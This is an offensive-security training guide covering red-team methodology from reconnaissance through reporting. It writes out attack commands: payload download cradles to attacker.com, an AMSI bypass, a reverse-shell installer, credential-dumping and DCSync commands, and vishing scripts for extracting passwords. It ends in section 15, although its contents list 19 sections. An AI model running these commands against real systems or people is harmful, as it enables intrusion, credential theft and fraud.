# 🔴 OFFENSIVE SECURITY & RED TEAMING — CORPORATE COMPLETE GUIDE

> **Audience:** Aspiring Red Teamers, Pentesters, Security Engineers entering offensive roles in corporate environments  
> **Scope:** Methodology, TTPs, tools, engagement lifecycle, real-world operations, legal & ethical framework  
> **Last Updated:** 2026

---

## 📋 TABLE OF CONTENTS

1. [What is Red Teaming?](#1-what-is-red-teaming)
2. [Red Team vs Pentest vs Bug Bounty](#2-red-team-vs-pentest-vs-bug-bounty)
3. [Engagement Lifecycle](#3-engagement-lifecycle)
4. [Reconnaissance — OSINT & Active Recon](#4-reconnaissance--osint--active-recon)
5. [Initial Access Techniques](#5-initial-access-techniques)
6. [Post-Exploitation — Establish Foothold](#6-post-exploitation--establish-foothold)
7. [Privilege Escalation](#7-privilege-escalation)
8. [Lateral Movement](#8-lateral-movement)
9. [Credential Access](#9-credential-access)
10. [Defense Evasion](#10-defense-evasion)
11. [Command & Control (C2) Infrastructure](#11-command--control-c2-infrastructure)
12. [Active Directory Attacks — Deep Dive](#12-active-directory-attacks--deep-dive)
13. [Web Application Attacks](#13-web-application-attacks)
14. [Physical & Social Engineering](#14-physical--social-engineering)
15. [Reporting & Communication](#15-reporting--communication)
16. [Lab Setup — Practice Environments](#16-lab-setup--practice-environments)
17. [Real-World Red Team Case Studies](#17-real-world-red-team-case-studies)
18. [Day in the Life of a Red Teamer](#18-day-in-the-life-of-a-red-teamer)
19. [Legal, Ethical & Corporate Framework](#19-legal-ethical--corporate-framework)

---

## 1. What is Red Teaming?

**Red Teaming** is a goal-oriented adversary simulation — a structured, authorized attack on an organization's people, processes, and technology to test real-world detection and response capability against realistic threat actors.

```
GOAL: "Can a determined, skilled attacker achieve [specific objective]
       given our current defenses — and would we detect them?"

Objectives are defined upfront, e.g.:
  - "Achieve Domain Admin access"
  - "Exfiltrate specific data (crown jewels)"
  - "Access the OT network from corporate network"
  - "Demonstrate Business Email Compromise against CFO"
```

### Red Team Philosophy

```
ATTACKER MINDSET:
  ├── There is always a way in
  ├── Defenders must be right every time; attackers only need to be right once
  ├── The most dangerous path is often the most unexpected one
  ├── People and processes are softer targets than technology
  └── Patience and persistence beat raw technical skill
```

---

## 2. Red Team vs Pentest vs Bug Bounty

| Aspect | Vulnerability Assessment | Penetration Test | Red Team | Bug Bounty |
|--------|-------------------------|-----------------|---------|-----------|
| **Goal** | Find all vulns | Exploit vulns, show impact | Simulate real APT, test detection | Find specific bugs |
| **Scope** | Broad, defined | Defined systems | Entire org, full kill chain | App/scope defined |
| **Duration** | Days | 1–4 weeks | 4–12+ weeks | Ongoing |
| **Stealth** | No | No | YES — stay undetected | No |
| **Blue Team aware?** | Yes | Yes | NO (tests real detection) | Yes |
| **Output** | Vuln list | Exploit chains | Narrative report, detection gaps | Bug report |
| **MITRE ATT&CK** | No | Partial | Full mapping | No |
| **Cost** | Low | Medium | High | Variable |
| **Who does it** | VA tool + analyst | Pentest team | Elite red team | Community |

### Purple Teaming

Red team + Blue team work **collaboratively** — Red attacks while Blue watches, learns, and improves detection in real-time. Best of both worlds for improving security posture faster.

---

## 3. Engagement Lifecycle

### Phase 1 — Planning & Scoping

```
PLANNING DELIVERABLES:
├── Rules of Engagement (RoE) — what's in scope, what's never allowed
├── Statement of Work (SoW) — legal authorization document
├── Emergency contacts — who to call if something goes wrong
├── Sensitive systems list — production DBs, OT, pacemakers, etc.
├── Threat actor profile — "APT29-style threat actor" or "commodity cybercrime"
├── Objectives — specific goals (Domain Admin, data exfiltration, BEC)
└── Communication protocols — how to report critical findings during engagement

RULES OF ENGAGEMENT EXAMPLES:
  ✅ Spear phishing employees is authorized
  ✅ Social engineering via phone is authorized
  ✅ Physical access testing is authorized
  ❌ Denial of service is NEVER authorized
  ❌ Destructive actions (ransomware, wiping) are NEVER authorized
  ❌ Production databases must not be modified
  ❌ Actions that would impact third parties outside the scope
```

### Phase 2 — Reconnaissance

Gather intelligence on the target before any direct interaction. (Covered in Section 4)

### Phase 3 — Initial Access

Establish first foothold inside the target environment. (Section 5)

### Phase 4 — Post-Exploitation

Expand access, establish persistence, move toward objective. (Sections 6-11)

### Phase 5 — Objective Achievement

Demonstrate impact aligned to engagement goals — exfiltrate simulated data, achieve Domain Admin, etc.

### Phase 6 — Reporting

Document findings, attack paths, detection gaps, and recommendations. (Section 15)

### Phase 7 — Remediation Validation

Re-test specific findings after remediation to confirm fixes work.

---

## 4. Reconnaissance — OSINT & Active Recon

### Passive OSINT (No direct target contact)

#### People & Organization

| Source | What you find | Tool |
|--------|--------------|------|
| **LinkedIn** | Employee names, titles, tech stack (job postings) | LinkedIn search, linkedin2username |
| **Google Dorking** | Exposed files, login pages, config files | site:target.com filetype:pdf |
| **Job Postings** | Security tools in use, tech stack, cloud providers | Glassdoor, Indeed, company careers |
| **WHOIS** | Registrant info, registrar, DNS servers | whois, viewdns.info |
| **Annual Reports / Press Releases** | Acquisitions (new IP ranges), partnerships | Company website, SEC EDGAR |
| **GitHub / GitLab** | Leaked credentials, API keys, internal code | truffleHog, GitLeaks, GitHub search |
| **Pastebin / Dark Web** | Credential dumps, employee PII | Dehashed, HaveIBeenPwned |

#### Technical OSINT

| Source | What you find | Tool |
|--------|--------------|------|
| **Shodan** | Exposed services, banners, ASN | shodan.io |
| **Censys** | TLS certs, running services | censys.io |
| **Certificate Transparency** | All subdomains from TLS certs | crt.sh |
| **DNS records** | Subdomains, MX, TXT (SPF/DKIM) | dnsdumpster.com, subfinder, amass |
| **BuiltWith / Wappalyzer** | Web tech stack | builtwith.com |
| **Wayback Machine** | Old pages, exposed files, past tech | web.archive.org |
| **Google Dorks** | Exposed files, panels, configs | exploit-db.com/google-hacking-database |

### Google Dork Examples

```
Find login pages:    site:target.com inurl:login
Find exposed files:  site:target.com filetype:pdf OR filetype:xlsx
Find config files:   site:target.com ext:xml OR ext:conf OR ext:ini
Find cameras:        intitle:"webcam" site:target.com
Find open dirs:      intitle:"Index of" site:target.com
Find vpn portals:    site:target.com "SSL VPN" OR "Pulse Secure" OR "GlobalProtect"
```

### Active Reconnaissance

```
PORT & SERVICE SCANNING:
  nmap -sS -T4 -p- target.com              # Full TCP SYN scan
  nmap -sV -sC -p 80,443,22,3389 target.com # Service version + default scripts
  nmap -O target.com                        # OS fingerprinting
  masscan -p1-65535 target.com --rate=1000  # Faster, noisier full port scan

SUBDOMAIN ENUMERATION:
  subfinder -d target.com                   # Passive subdomain discovery
  amass enum -d target.com                  # Active + passive discovery
  ffuf -w wordlist.txt -u https://FUZZ.target.com -mc 200 # Brute force

WEB RECON:
  whatweb target.com                        # Tech fingerprinting
  nikto -h target.com                       # Web vulnerability scanner
  gobuster dir -u target.com -w wordlist    # Directory brute force
  feroxbuster -u target.com                 # Recursive dir brute force

EMAIL HARVESTING:
  theHarvester -d target.com -b google,linkedin  # Email gathering
  hunter.io API                                  # Email format discovery
```

---

## 5. Initial Access Techniques

### 5.1 Phishing (Most Common Initial Access)

**Spear Phishing (Targeted):**
```
ATTACK CHAIN:
1. OSINT: Find target employee (CEO assistant, IT admin)
2. Pretexting: Create believable scenario (IT security update, invoice, package)
3. Infrastructure: Register lookalike domain (acme-corp.com vs acmecorp.com)
4. Payload: Crafted document with macro, LNK file, or HTML smuggling
5. Delivery: Send from lookalike domain with stolen branding
6. Result: Victim opens → macro executes → beacon established

INFRASTRUCTURE CHECKLIST:
  ├── Lookalike domain registered > 30 days old (less spam filtered)
  ├── SPF/DKIM/DMARC configured for domain (pass email gateways)
  ├── SSL certificate installed
  ├── Valid MX records configured
  └── Categorized as business/technology (avoids URL filters)
```

**Phishing payload types:**
| Payload | Detection Rate | Notes |
|---------|---------------|-------|
| Office macro (old style) | HIGH | Most AV catches these now |
| HTML smuggling | MEDIUM | Assembles payload in browser (bypasses email gateway) |
| LNK file | MEDIUM-HIGH | Shortcut file executing PowerShell |
| ISO / IMG file | MEDIUM | Bypasses Mark-of-the-Web (MOTW) |
| PDF with link | LOW | Link to controlled infrastructure |
| QR code phishing | LOW | Bypasses email attachment scanning |

### 5.2 External Service Exploitation

```
ATTACK SURFACE:
  ├── VPN appliances (Pulse Secure, Fortinet, Citrix — check for CVEs)
  ├── Exchange / OWA / ActiveSync
  ├── Remote Desktop (RDP — port 3389 exposed)
  ├── SSH with password auth enabled
  ├── Web applications (OWASP Top 10)
  ├── Citrix/RDS gateways
  └── Third-party SaaS (supply chain)

CVE HUNTING:
  1. Identify target technology via Shodan/Censys banner grabbing
  2. Check version: is it vulnerable to known CVEs?
  3. Search ExploitDB, Metasploit modules, GitHub PoCs
  4. Test against staging/replica environment first

HIGH-VALUE RECENT CVE CLASSES:
  - ProxyShell/ProxyLogon (Exchange)
  - Log4Shell (Java applications)
  - VPN appliance pre-auth RCE (Pulse, Fortinet, Citrix)
  - MOVEit Transfer SQLi (2023)
```

### 5.3 Password Attacks (External)

```
CREDENTIAL STUFFING:
  Tool: Hydra, Burp Suite, custom scripts
  Source: Breached credential dumps (HaveIBeenPwned API, Dehashed)
  Target: VPN login, OWA, webmail, SSO portal

PASSWORD SPRAYING:
  Tool: Spray, MSOLSpray, Ruler (O365), kerbrute
  Method: 1 password tried against ALL accounts (avoids lockout)
  Common passwords: Season+Year (Spring2024!), Company+Year (Acme2024!)
  Timing: Wait > lockout window between attempts

  # Office 365 password spray
  MSOLSpray.ps1 -UserList users.txt -Password "Winter2024!" -Url https://login.microsoftonline.com
```

### 5.4 Watering Hole Attack

```
CONCEPT:
  Instead of going to the target, compromise a site the target visits
  
EXAMPLE:
  Target company's employees regularly visit an industry forum
  Red team compromises the forum (or injects via XSS)
  When employees visit → payload delivered
  
IN CORPORATE RED TEAMS:
  Often simulated by creating a clone of a site employees use
  and redirecting via DNS/phishing
```

### 5.5 Supply Chain (Advanced)

Compromise a trusted vendor/software used by the target:
- Update mechanism poisoning (SolarWinds-style)
- Malicious open-source package (dependency confusion, typosquatting)
- Third-party IT/MSP compromise (pivot through vendor's access)

---

## 6. Post-Exploitation — Establish Foothold

### Establishing Persistence

```
PERSISTENCE MECHANISMS (Windows):
├── Registry Run Keys
│   HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│
├── Scheduled Tasks
│   schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc hourly
│
├── Services
│   sc create "WindowsUpdater" binpath="C:\payload.exe"
│
├── WMI Event Subscriptions
│   Persistent WMI filter + consumer → executes on event trigger
│   Very hard to detect, survives reboots
│
├── Startup Folder
│   C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
│
├── DLL Hijacking
│   Place malicious DLL where application looks first
│
└── BITS Jobs (Background Intelligent Transfer Service)
    Legitimate Windows feature, can persist payloads

PERSISTENCE MECHANISMS (Linux):
├── Cron jobs (/etc/crontab, /var/spool/cron)
├── ~/.bashrc / ~/.profile (user startup)
├── /etc/rc.local (system startup)
├── SSH authorized_keys (backdoor SSH key)
└── Systemd service unit
```

### C2 Beacon Behavior

```
BEACON CHARACTERISTICS:
  Jitter: Randomize callback interval (±20%) to avoid pattern detection
  Sleep: Longer sleep = less noisy, slower operations
  Protocol: HTTPS over port 443 blends with normal traffic
  
EXAMPLE C2 CONFIG (Cobalt Strike beacon):
  Sleep: 60 seconds (callback every minute)
  Jitter: 30% (so actually 42-78 seconds, random)
  C2 server: Looks like legitimate CDN (AWS CloudFront domain)
  Protocol: HTTPS with valid certificate
  
DETECTION AVOIDANCE:
  - Callback only during business hours (08:00-18:00 local)
  - Use CDN/cloud provider IPs (blend with normal cloud traffic)
  - Rotate domains (domain fronting or multiple C2s)
  - Use legitimate-looking User-Agent strings
```

---

## 7. Privilege Escalation

### Windows Privilege Escalation

#### Local Privilege Escalation (Low user → SYSTEM/Admin)

```
ENUMERATION (What to look for):
  winPEAS.exe          # Automated privilege escalation enumeration
  PowerUp.ps1          # PowerShell-based priv esc checks
  Seatbelt.exe         # Host security assessment

COMMON VECTORS:

1. UNQUOTED SERVICE PATHS:
   Service path: C:\Program Files\My Service\myservice.exe
   If path has spaces + no quotes:
   Windows looks for: C:\Program.exe first → attacker drops payload there
   
   Check: wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """

2. WEAK SERVICE PERMISSIONS:
   If attacker can modify service binary or config → replace with malicious binary
   Check: sc qc <servicename>, icacls <service binary path>

3. ALWAYS INSTALL ELEVATED:
   If enabled → any MSI installer runs as SYSTEM
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   Exploit: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi
            msiexec /quiet /qn /i evil.msi

4. TOKEN IMPERSONATION (Potato attacks):
   If process has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
   JuicyPotato, RoguePotato, PrintSpoofer, GodPotato
   → Escalate from service account to SYSTEM

5. KERNEL EXPLOITS:
   Older systems → check unpatched kernel CVEs
   Use wesng.py or watson.exe to identify missing patches
   Risk: Can crash system — avoid in production unless client accepts risk

6. SCHEDULED TASKS (weak permissions):
   Task runs as ADMIN, binary writable by current user → replace binary
```

### Linux Privilege Escalation

```
ENUMERATION:
  linPEAS.sh         # Automated Linux priv esc enumeration
  linux-exploit-suggester.sh # Kernel exploit suggestions

COMMON VECTORS:

1. SUDO MISCONFIGURATION:
   sudo -l            # What can this user sudo?
   
   (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/sh \; -quit → root shell
   GTFOBins: gtfobins.github.io → escape binaries that can be sudo'd

2. SUID BINARIES:
   find / -perm -4000 2>/dev/null   # Find SUID binaries
   If unusual binary has SUID → check GTFOBins for exploitation

3. CRON JOBS:
   cat /etc/crontab
   ls -la /etc/cron.*
   If script is writable by current user → modify to add reverse shell

4. WRITABLE /ETC/PASSWD:
   If writable → add root-equivalent user:
   echo 'hacker:$1$hacker$...:0:0:root:/root:/bin/bash' >> /etc/passwd

5. KERNEL EXPLOITS:
   uname -a → kernel version
   DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847) — historical examples

6. NFS NO_ROOT_SQUASH:
   showmount -e target
   If no_root_squash → mount share, create SUID binary as local root
```

---

## 8. Lateral Movement

### Windows Lateral Movement Techniques

```
PsExec (SMB-based):
  psexec.py domain/user:password@target  # Impacket
  psexec \\target -u user -p password cmd
  Requires: Admin share access (C$, ADMIN$)
  Detection: Creates PSEXESVC service, Event 7045

WMI (Windows Management Instrumentation):
  wmiexec.py domain/user:password@target  # Impacket
  wmic /node:target process call create "cmd /c whoami > C:\out.txt"
  Detection: wmiprvse.exe spawning unusual processes

PowerShell Remoting (WinRM):
  Enter-PSSession -ComputerName target -Credential $cred
  Invoke-Command -ComputerName target -ScriptBlock {whoami}
  Requires: WinRM enabled (port 5985/5986)
  Detection: wsmprovhost.exe on target, Event 4688

RDP (Remote Desktop):
  mstsc /v:target  # Interactive RDP
  xfreerdp /u:user /p:password /v:target  # Linux client
  Detection: Event 4624 logon type 10, Event 4778 (session reconnect)

Pass-the-Hash (NTLM):
  pth-winexe -U domain/user%NTLMHASH //target cmd.exe
  impacket-wmiexec -hashes :NTLMHASH domain/user@target
  Detection: Event 4624 logon type 3 with NTLM auth without prior password

Pass-the-Ticket (Kerberos):
  mimikatz sekurlsa::tickets /export  # Export tickets
  Rubeus.exe ptt /ticket:base64       # Import ticket
  Detection: Anomalous ticket usage, unusual TGS requests

DCOM:
  ShellWindows, ShellBrowserWindow, MMC20.Application objects
  Hard to detect — uses legitimate DCOM infrastructure
```

---

## 9. Credential Access

### Dumping Credentials

```
LSASS MEMORY DUMP (richest source):
  # Method 1: Mimikatz (most detected)
  mimikatz.exe "sekurlsa::logonpasswords" exit
  
  # Method 2: Task Manager (less detected)
  Right-click lsass.exe → Create dump file
  
  # Method 3: ProcDump (legitimate Sysinternals tool)
  procdump.exe -ma lsass.exe lsass.dmp
  # Then parse offline: pypykatz lsa minidump lsass.dmp
  
  # Method 4: MiniDumpWriteDump API via custom tool
  → Customize to evade AV signatures on mimikatz binary

  WHAT YOU GET FROM LSASS:
  ├── NTLM hashes (usable for Pass-the-Hash)
  ├── Kerberos tickets (usable for Pass-the-Ticket)
  ├── Cleartext passwords (if WDigest enabled — Win 7/old)
  └── DPAPI masterkeys

SAM DATABASE (local accounts):
  reg save HKLM\SAM C:\sam.bak
  reg save HKLM\SYSTEM C:\system.bak
  # Offline: impacket-secretsdump -sam sam.bak -system system.bak LOCAL

NTDS.DIT (All domain accounts):
  # Volume Shadow Copy method
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\ntds.dit C:\
  # Parse: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  
  # DCSync (requires domain replication rights)
  mimikatz "lsadump::dcsync /domain:acme.com /all /csv" exit
  impacket-secretsdump domain/user:password@dc-ip -just-dc

CREDENTIAL MANAGER / BROWSER:
  cmdkey /list                        # Windows Credential Manager
  SharpChrome (Chrome passwords)
  LaZagne.exe all                     # Multi-source credential dumper
```

### Kerberoasting (Detailed)

```
KERBEROASTING:
  Step 1: List service accounts with SPNs
    GetUserSPNs.py domain/user:password -dc-ip DC_IP
    
  Step 2: Request TGS for each SPN
    GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
    
  Step 3: Save hashes to file
    GetUserSPNs.py ... -outputfile kerberoast_hashes.txt
    
  Step 4: Crack offline
    hashcat -m 13100 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule
    
  WHAT TO LOOK FOR IN RESULTS:
  - Service accounts with Domain Admin or privileged group membership
  - Accounts that look like they haven't changed passwords recently
  
  DEFENSE (for blue team context):
  - gMSA (Group Managed Service Accounts) — auto-rotating 240-char passwords
  - Regular service account password rotation with high complexity
  - AES encryption instead of RC4 for Kerberos (RC4 = easily crackable hash)
```

---

## 10. Defense Evasion

### AV/EDR Evasion Concepts

```
DETECTION LAYERS TO EVADE:
  1. Static signature detection (AV)
  2. Behavioral detection (EDR)
  3. AMSI (Antimalware Scan Interface) — scans PowerShell in memory
  4. ETW (Event Tracing for Windows) — telemetry source for EDR
  5. Kernel callbacks (EDR hooks in kernel)

STATIC EVASION TECHNIQUES:
  ├── Obfuscation: Encode payload (base64, XOR, custom)
  ├── Packing: Compress/encrypt executable, decrypt at runtime
  ├── Binary modification: Change byte signatures AV detects
  ├── Recompilation: Recompile known tools with different source
  └── Code signing: Sign with valid (or stolen) code signing cert

BEHAVIORAL EVASION:
  ├── Sleep: Long sleep before execution (avoids sandbox timeout)
  ├── Sandbox detection: Check for VM artifacts, low RAM, no mouse movement
  ├── Living off the Land (LotL): Use built-in Windows tools
  │     PowerShell, certutil, mshta, regsvr32, rundll32, bitsadmin
  ├── Process injection: Inject shellcode into legitimate process (svchost)
  ├── Parent process spoofing: Make malware appear to spawn from explorer.exe
  └── Unhook EDR: Remove EDR's hooks from ntdll.dll to avoid detection

AMSI BYPASS:
  # Classic patch (detects quickly now)
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  
  # More modern: AMSI context corruption, provider patching, etc.

POWERSHELL EVASION:
  -ExecutionPolicy Bypass  # Bypass script policy
  -EncodedCommand <b64>    # Encode entire command
  -WindowStyle Hidden      # Don't show console window
  -NonInteractive          # No user interaction mode
  -NoProfile               # Don't load profile (faster, stealthier)
```

### Living off the Land (LotL) Techniques

```
CERTUTIL (certificate management binary):
  certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
  # Download file using legitimate Windows binary

REGSVR32:
  regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
  # Execute script from URL — "Squiblydoo" technique, bypasses AppLocker

MSHTA:
  mshta http://attacker.com/payload.hta
  # Execute HTA (HTML Application) from URL

RUNDLL32:
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...
  # Execute code through legitimate DLL loader

BITSADMIN:
  bitsadmin /transfer job /download /priority normal http://attacker.com/payload.exe C:\tmp\payload.exe
  # Download via Background Intelligent Transfer Service

WMIC:
  wmic process call create "powershell.exe -enc ..."
  # Execute via WMI

POWERSHELL DOWNLOAD CRADLES:
  IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
  IEX (Invoke-WebRequest 'http://attacker.com/payload.ps1' -UseBasicParsing).Content
```

---

## 11. Command & Control (C2) Infrastructure

### C2 Framework Comparison

| C2 Framework | Type | Key Features | Detection Level |
|-------------|------|-------------|----------------|
| **Cobalt Strike** | Commercial (\$3,500/yr) | Most widely used, Malleable C2, beacon | High (well-known signatures) |
| **Metasploit/Meterpreter** | Free/Open-source | Many modules, easy to use | High (very common, well-detected) |
| **Sliver** | Free/Open-source | Modern, Go-based, mTLS/HTTP/DNS/WireGuard | Medium (newer, less signatures) |
| **Havoc** | Free/Open-source | Modern, active development | Medium |
| **Brute Ratel C4** | Commercial (\$2,500/yr) | Designed to evade EDR | Low-Medium |
| **Nighthawk** | Commercial | Very low detection, enterprise red teams | Low |

### Malleable C2 Profiles (Cobalt Strike Concept)

```
IDEA: Shape beacon traffic to look like legitimate applications

EXAMPLE — Make beacon look like Google Analytics traffic:
  http-get {
    set uri "/ga.js";
    client {
      header "Accept" "text/javascript";
      header "Host" "www.google-analytics.com";
      metadata { base64; prepend "GA1.2."; header "Cookie"; }
    }
    server {
      header "Content-Type" "text/javascript";
      header "X-XSS-Protection" "1; mode=block";
    }
  }

RESULT: Firewall sees HTTPS to Google's analytics domain — looks legitimate
        IDS/proxy may whitelist Google Analytics traffic
```

### C2 Infrastructure Setup

```
OPERATOR MACHINE → TEAM SERVER → REDIRECTORS → BEACON (VICTIM)

REDIRECTORS:
  Why: Protect team server IP from detection
  How: Cloud VPS (AWS, DigitalOcean) proxies traffic to team server
  Technique: Apache mod_rewrite rules to filter non-C2 traffic
  Domain: Use categorized domain (cloud-update-service.com) to bypass URL filters

DOMAIN FRONTING (Now mostly blocked by CDNs):
  Use a legitimate CDN domain (Cloudflare, Amazon CloudFront) as the HTTP Host header
  Traffic appears to go to CDN — actually routes to your C2

CDN-BASED C2:
  Host payload/C2 on Azure/AWS/Cloudflare domains
  Traffic appears to come from major cloud provider IPs
  Most organizations don't block all Microsoft/Amazon IP ranges
```

---

## 12. Active Directory Attacks — Deep Dive

### BloodHound — Attack Path Discovery

```
BLOODHOUND WORKFLOW:

1. RUN SHARPHOUND (DATA COLLECTOR):
   SharpHound.exe -c All --zipfilename bloodhound.zip
   # Collects: Users, Groups, GPOs, Sessions, ACLs, Trusts
   
2. IMPORT TO BLOODHOUND GUI:
   Start Neo4j database
   Open BloodHound → Import bloodhound.zip
   
3. KEY QUERIES:
   "Find Shortest Path to Domain Admins"     → Visualize attack path
   "Find all Domain Admins"                  → List targets
   "Find Kerberoastable Accounts"            → Service accounts to attack
   "Find AS-REP Roastable Accounts"          → Accounts with no pre-auth
   "Find Computers where Domain Admins are logged in" → Where are creds cached?
   "Shortest Paths to Unconstrained Delegation" → Machines that get TGTs
   
4. TYPICAL FINDING:
   Low-priv user → has GenericWrite on SVC-BACKUP →
   SVC-BACKUP is member of SERVER-ADMINS →
   SERVER-ADMINS has LocalAdmin on FileServer01 →
   FileServer01 has Domain Admin logged in → DCSync possible
```

### ACL Abuse (Active Directory Access Control)

```
DANGEROUS ACL PERMISSIONS:
  GenericAll        → Full control over object (change password, add to group)
  GenericWrite      → Write to non-protected attributes (add to group, set SPN)
  WriteOwner        → Become owner → get GenericAll
  WriteDACL         → Modify DACL → grant yourself GenericAll
  AllExtendedRights → All extended rights (ForceChangePassword, Replication)
  AddMember         → Add members to group
  
EXPLOITATION EXAMPLES:

  GenericAll on USER:
    # Force password change
    net user targetUser NewPassword123! /domain
    
  GenericWrite on USER:
    # Add SPN → Kerberoast the account
    Set-DomainObject -Identity targetUser -Set @{serviceprincipalname="fake/spn"}
    
  GenericAll on GROUP:
    # Add yourself to Domain Admins
    Add-DomainGroupMember -Identity "Domain Admins" -Members "compromisedUser"
    
  WriteDACL on DOMAIN:
    # Grant yourself DCSync rights
    Add-DomainObjectAcl -TargetIdentity "DC=acme,DC=com" -PrincipalIdentity attackerUser 
      -Rights DCSync
```

### ASREPRoasting

```
FIND VULNERABLE ACCOUNTS:
  # Accounts with "Do not require Kerberos preauthentication" enabled
  GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip DC_IP
  
  # With credentials
  GetNPUsers.py domain/user:password -dc-ip DC_IP -request
  
CRACK:
  hashcat -m 18200 asrep.txt wordlist.txt

DEFENSE:
  Enable Kerberos preauthentication on all accounts
  (Default is enabled; must be explicitly disabled — check for legacy reasons)
```

### Constrained vs Unconstrained Delegation

```
UNCONSTRAINED DELEGATION:
  Machine/account trusted to delegate to ANY service
  When a privileged user (Domain Admin) authenticates to this machine,
  their TGT is cached in memory on that machine
  
  ATTACK:
  1. Find machine with unconstrained delegation: Get-DomainComputer -Unconstrained
  2. Get local admin on that machine (via other exploit)
  3. Wait for Domain Admin to connect (or coerce using PrinterBug/PetitPotam)
  4. Extract TGT from memory: mimikatz sekurlsa::tickets /export
  5. Use TGT to impersonate Domain Admin
  
CONSTRAINED DELEGATION:
  Account trusted to delegate to SPECIFIC services only
  
  ATTACK (S4U2Self + S4U2Proxy):
  1. Find accounts with constrained delegation: Get-DomainUser -TrustedToAuth
  2. Compromise that account
  3. Use S4U2Self to impersonate ANY user (even DA)
  4. Use S4U2Proxy to get TGS for the allowed service as that user
  5. Access the service as Domain Admin
```

---

## 13. Web Application Attacks

### OWASP Top 10 — Red Team Perspective

```
A01 BROKEN ACCESS CONTROL:
  Test: Access /admin, /api/v1/users/2 (IDOR), change user ID in requests
  Tool: Burp Suite Intruder, manual testing
  Impact: Access other users' data, admin functions

A02 CRYPTOGRAPHIC FAILURES:
  Test: Check for HTTP (not HTTPS), weak ciphers, sensitive data in URLs
  Look for: Password/key material in source code, client-side, localStorage

A03 INJECTION (SQL, LDAP, OS, SSTI):
  SQL: ' OR 1=1--, sqlmap -u "url" --dbs
  SSTI: {{7*7}} in template fields → 49 means vulnerable

A07 IDENTIFICATION & AUTH FAILURES:
  Test: Password spraying, credential stuffing, default credentials
  Look for: No account lockout, weak password policy, JWT vulnerabilities

A09 SECURITY LOGGING & MONITORING FAILURES:
  Red team: What can you do without triggering alerts?
  Burp Suite: Active scanning → watch for WAF/IDS responses
```

### SQL Injection — Red Team Techniques

```
DETECTION:
  ' → SQL error = possibly injectable
  ' OR '1'='1 → Boolean-based
  ' WAITFOR DELAY '0:0:5'-- → Time-based (MSSQL)
  ' AND SLEEP(5)-- → Time-based (MySQL)

SQLMAP (AUTOMATION):
  sqlmap -u "http://target.com/page?id=1" --dbs          # Enumerate databases
  sqlmap -u "..." -D dbname --tables                     # List tables
  sqlmap -u "..." -D dbname -T users --dump              # Dump table
  sqlmap -u "..." --os-shell                             # OS command execution
  sqlmap -u "..." --file-read="/etc/passwd"              # Read files

MSSQL OS EXECUTION (xp_cmdshell):
  EXEC xp_cmdshell 'whoami'
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;  -- Enable if disabled
```

---

## 14. Physical & Social Engineering

### Physical Access Testing

```
COMMON PHYSICAL ATTACK VECTORS:
  ├── Tailgating: Follow authorized person through secured door
  ├── Impersonation: Pose as IT, delivery, cleaning crew, auditor
  ├── USB drops: Leave malicious USB drives in parking lots
  ├── Badge cloning: RFID/HID badge readers can clone badges
  ├── Lock picking: Physical access to server rooms, wiring closets
  └── Dumpster diving: Discarded documents, hardware

PLANNING PHYSICAL SOCIAL ENGINEERING:
  1. OSINT: Find employee names, badge photos, dress code from LinkedIn
  2. Pretext: "IT security team doing cable audit" / "Fire marshal inspection"
  3. Props: Branded polo shirt, lanyard with fake badge, clipboard
  4. Timing: Come during lunch (reduced security scrutiny)
  5. Abort conditions: If questioned and pretext isn't working → leave
  6. Documentation: Video evidence of entry (body cam / hidden cam)
```

### Vishing (Voice Phishing)

```
PRETEXTS:
  IT Helpdesk: "Hi, I'm from IT security. We detected unusual activity on your account.
                I need to verify your identity and reset your password. Can you confirm
                your current password so I can validate the reset?"
  
  HR: "I'm from HR. There's an urgent issue with your benefits enrollment that
       expires today. I need your employee ID and last 4 SSN to process this."
  
  Vendor: "This is [Software Vendor] support. Your license is expiring and causing
           system issues. I need remote access to fix it urgently."

WHAT TO EXTRACT:
  - Username / employee ID
  - Password (direct or reset)
  - MFA bypass (tell them the OTP to "verify")
  - Physical access (agree to let you in)
  - Sensitive internal information
```

---

## 15. Reporting & Communication

### Red Team Report Structure

```
EXECUTIVE SUMMARY (1-2 pages):
  ├── Engagement overview (scope, duration, methodology)
  ├── High-level findings (did we achieve objective? How?)
  ├── Risk rating summary
  └── Top 3-5 recommendations

TECHNICAL NARRATIVE (Attack Path):
  └── Step-by-step story of what happened:
      "On Day 3, we sent a spear-phishing email to Sarah Jones (Finance).
      Within 2 hours, Sarah opened the attachment. Our Cobalt Strike beacon
      connected from her workstation (10.1.5.43) to our C2 server.
      We extracted 3 NTLM hashes from LSASS, including the service account
      SVC-BACKUP. Cracking this offline in 4 hours revealed the password
      'Winter2023!'. Using these credentials we moved to FileServer01..."

FINDINGS:
  For each finding:
  ├── Finding Title
  ├── Severity (Critical/High/Medium/Low)
  ├── MITRE ATT&CK Technique ID (e.g., T1566.001)
  ├── Description (what was found)
  ├── Evidence (screenshots, tool output, logs)
  ├── Impact (what could happen in a real attack)
  ├── Remediation (specific actionable steps)
  └── Remediation Difficulty (Easy/Medium/Hard)

DETECTION GAPS REPORT:
  └── Which activities were NOT detected?
